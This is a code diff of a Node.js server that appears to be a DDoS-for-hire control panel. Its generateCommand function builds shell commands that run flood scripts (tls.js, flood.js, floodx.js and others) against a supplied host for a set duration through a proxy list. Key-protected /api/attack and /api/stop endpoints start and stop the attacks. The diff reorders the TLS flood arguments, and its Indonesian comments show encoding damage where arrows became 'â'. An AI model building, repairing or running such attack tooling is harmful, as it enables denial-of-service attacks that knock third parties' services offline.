@@ -30,7 +30,7 @@ const activeProcesses = new Map();
 
 function generateCommand(method, host, time) {
   switch (method) {
-    case 'TLS':       return `node tls.js ${host} ${time} 32 4 proxy.txt`;
+    case 'TLS':       return `node tls.js ${host} ${time} 4 proxy.txt 32`;
     case 'TLSV4':     return `node tlsv4.js ${host} ${time} 50 8`;
     case 'FLOOD':     return `node flood.js ${host} ${time} 50 4 proxy.txt`;
     case 'FLOODX':    return `node floodx.js ${host} ${time} 8 3 proxy.txt`;
@@ -108,8 +108,8 @@ app.get('/api/attack', auth, (req, res) => {
 });
 
 // ===== STOP (filter by method optional) =====
-// /api/stop?key=yeah              → stop semua
-// /api/stop?key=yeah&method=TLS   → stop method TLS saja
+// /api/stop?key=yeah              â stop semua
+// /api/stop?key=yeah&method=TLS   â stop method TLS saja
 app.get('/api/stop', auth, (req, res) => {
   const { method } = req.query;
   const targetMethod = method ? method.toUpperCase() : null;
